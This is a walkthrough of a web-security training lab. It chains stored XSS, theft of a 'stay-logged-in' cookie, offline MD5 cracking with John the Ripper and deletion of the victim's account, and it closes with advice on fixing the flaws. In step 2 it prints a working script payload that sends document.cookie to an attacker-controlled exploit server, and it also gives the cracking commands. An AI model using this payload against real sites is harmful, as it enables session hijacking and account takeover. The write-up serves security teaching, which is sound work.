Lab Description

This lab is vulnerable to a stored XSS attack that allows an attacker to steal session cookies. One of the cookies contains a hashed password that can be cracked offline.

To solve the lab, we must use XSS to steal Carlos's cookie, crack his MD5 password hash using John the Ripper, and then delete his account.

Mindset & Strategy

The "stay-logged-in" feature often stores sensitive data in the browser. If an application is vulnerable to XSS, an attacker can execute JavaScript in the victim's browser to send these cookies to an external server controlled by the attacker.

Once we have the hash, we move from Online to Offline attacking. Using a wordlist like rockyou.txt, we can compare millions of potential passwords against the hash without ever touching the target server again, bypassing all rate limits.

Step-By-Step-Execution

1. Identify XSS: Log in with wiener:peter. Go to any blog post and test the comment section for XSS using <script>alert("hello hackers")</script>. If an alert pops up, the field is vulnerable.

2. Prepare Stealer Payload: Go to the Exploit Server. We will use a fetch command to send the victim's cookie to our Access Log:
<script>fetch('https://YOUR-EXPLOIT-ID.exploit-server.net/log?cookie=' + document.cookie);</script>

3. Exfiltrate Cookie: Post the script in the comment section. Wait for a few moments for the victim (Carlos) to view the page. Now, check the Access Log on your exploit server.

4. Analyze the Loot: Look for a request containing a stay-logged-in cookie. Copy the Base64 string. Decode it in Burp Decoder to find the format: carlos:[MD5_HASH].

5. Prepare for Cracking: Open your Kali Linux terminal. Save the extracted MD5 hash into a file using nano offcrack.txt. Paste only the hash part, save (Ctrl+O), and exit (Ctrl+X).

6. Cracking with John: Use John the Ripper with the rockyou.txt wordlist:
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt offcrack.txt

7. Retrieve Password: Once finished, view the cracked password using:
john --show --format=raw-md5 offcrack.txt.
The password for Carlos is onceuponatime.

8. Account Deletion: Log in as carlos:onceuponatime. Go to the account settings, click "Delete Account," and confirm with the password to solve the lab.

Technical Explanation

This lab demonstrates a Chained Attack. First, a Stored XSS vulnerability is used to bypass the "Same-Origin Policy" and access document.cookie. Second, the use of a weak hashing algorithm (MD5) without a Salt allows for rapid offline brute-forcing. Because the cracking happens on the attacker's machine, the server has no way of detecting or blocking the millions of password guesses.

Conclusion: Sensitive information like password hashes should never be stored in client-side cookies. Furthermore, preventing XSS is the first line of defense; if an attacker can't run scripts, they can't steal the tokens in the first place.

How To Fix

°      HttpOnly Cookies: Set the HttpOnly flag on sensitive cookies. This prevents JavaScript from accessing them via document.cookie.

°      Output Encoding: Use context-aware output encoding to prevent XSS in comment sections and other user-input areas.

°      Strong Hashing: If you must store a persistent session, use a cryptographically secure random token that has no relationship to the user's actual password.
